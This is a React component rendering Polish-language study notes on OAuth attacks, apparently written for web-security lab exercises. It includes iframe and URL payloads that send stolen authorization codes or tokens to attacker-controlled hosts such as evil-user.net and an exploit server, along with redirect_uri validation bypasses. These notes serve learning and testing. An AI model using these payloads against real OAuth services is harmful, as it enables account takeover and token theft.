import oauth_01 from '../../../assets/oauth_01.png';
import oauth_02 from '../../../assets/oauth_02.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const OAuth = () =>{
    return(
        <section>
            <h1>OAuth</h1>

            <details>
                <summary>Rozpoznanie OAuth</summary>
                <p>Niezależnie od tego, który typ przyznania OAuth jest używany, pierwszym żądaniem przepływu będzie <span className="important">zawsze żądanie do punktu końcowego /authorization zawierającego szereg parametrów zapytania</span>, które są używane specjalnie dla OAuth. W szczególności zwróć uwagę na <span className="important">parametry client_id, redirect_uri i response_type</span>. Na przykład żądanie autoryzacji będzie zazwyczaj wyglądać mniej więcej tak:</p>
            
                <div className="waring">
                    <p>GET /authorization?<span className="important">client_id</span>=12345&<span className="important">redirect_uri</span>=https://client-app.com/callback&<span className="important">response_type</span>=token&<span className="important">scope</span>=openid%20profile&<span className="important">state</span>=ae13d489bd00e3c24 HTTP/1.1</p>
                    <p>Host: oauth-authorization-server.com</p>
                </div>
            
            </details>

            <hr />

            <details>
                <summary>CSRF</summary>
                <div className="waring">
                    <p>Poszukiwanie w url token/ code dla zalogowanego usera np <span className="important">/oauth-linking?code=[...]</span></p>
                    <p>Następnie można ten url z tokenem/ code w IFrame</p>
                    <p>{`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=`}<span className="important">STOLEN-CODE</span>{`"></iframe>`}</p>
                    <p>Wysyłamy do ofiary by została połączone z naszym kontem dostając przy tym uprawnienia admina</p>
                </div>
            
            </details>

            <hr />

            <details>
                <summary>Wyciek kodów autoryzacyjnych i tokenów dostępu</summary>

                <p>W zależności od typu przyznania, kod lub token jest wysyłany za pośrednictwem przeglądarki ofiary do punktu końcowego <span className="important">/callback</span> określonego <span className="important">w parametrze redirect_uri</span> żądania autoryzacji. Jeśli usługa OAuth nie zweryfikuje prawidłowo tego URI, atakujący może skonstruować <span className="important">atak podobny do CSRF</span>, oszukując przeglądarkę ofiary, aby zainicjowała przepływ OAuth, który <span className="important">wyśle ​​kod lub token do kontrolowanego przez atakującego redirect_uri</span>.</p>
            
                <div className="waring">
                    <p>{`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?`}<span className="important">{`client_id=YOUR-LAB-CLIENT-ID`}</span>{`&`}<span className="important">redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span>{`&response_type=code&scope=openid%20profile%20email"></iframe>`}</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Błędna walidacja redirect_uri</summary>

                <p>Niektóre implementacje umożliwiają zakres podkatalogów, sprawdzając tylko, czy ciąg zaczyna się od poprawnej sekwencji znaków, tj. zatwierdzonej domeny. Powinieneś spróbować usunąć lub dodać dowolne ścieżki, parametry zapytania i fragmenty, aby zobaczyć, co możesz zmienić bez wywoływania błędu.Jeśli możesz dodać dodatkowe wartości do domyślnego parametru redirect_uri, możesz być w stanie wykorzystać rozbieżności między analizą URI przez różne komponenty usługi OAuth.</p>
                
                <div className="waring">
                    <p>https://default-host.com <span className="important">&@foo.evil-user.net#@bar.evil-user.net</span>/</p>
                </div>

                <p>Czasami możesz natknąć się na luki w zabezpieczeniach związane z zanieczyszczeniem parametrów po stronie serwera</p>
                <div className="waring">
                    <p>https://oauth-authorization-server.com/?client_id=123&<span className="important">redirect_uri=client-app.com/</span>callback&<span className="important">redirect_uri=evil-user.net</span></p>
                </div>

                <p>W niektórych przypadkach każdy adres URI przekierowania zaczynający się od <span className="important">localhost</span> może zostać przypadkowo dozwolony w środowisku produkcyjnym. Może to umożliwić ominięcie walidacji poprzez zarejestrowanie nazwy domeny</p>
                <div className="waring">
                    <p><span className="important">localhost</span>.evil-user.net</p>
                </div>

            </details>

            <hr />

            <details>
                <summary>Kradzież kodów i tokenów dostępu za pośrednictwem strony proxy</summary>

                <p>URI będzie często znajdował się na ścieżce specyficznej dla OAuth, takiej jak /oauth/callback, która prawdopodobnie nie będzie miała żadnych interesujących podkatalogów. Możesz jednak użyć sztuczek przechodzenia przez katalogi, aby podać dowolną ścieżkę w domenie. Coś takiego:</p>
                <div className="waring">
                    <p>https://client-app.com/oauth/callback/../../example/path</p>
                </div>
                
                <p>Backend może zinterpretować to jako:</p>

                <div className="waring">
                    <p>https://client-app.com/example/path</p>
                </div>

                <p>Przykład:</p>
                <div>
                    <p>https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=<span className="important">https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span>/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Typ przyznania code autoryzacyjnego</summary>

                <p>GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&<span className="important">response_type=code</span>&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1</p>
                <ExampleFrame screen={oauth_01} />
            </details>

            <hr />

            <details>
                <summary>Typ przyznania token autoryzacyjnego</summary>

                <p>GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&<span className='important'>response_type=token</span>&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1</p>
                <ExampleFrame screen={oauth_02} />
            </details>

        </section>
    )
}

export default OAuth;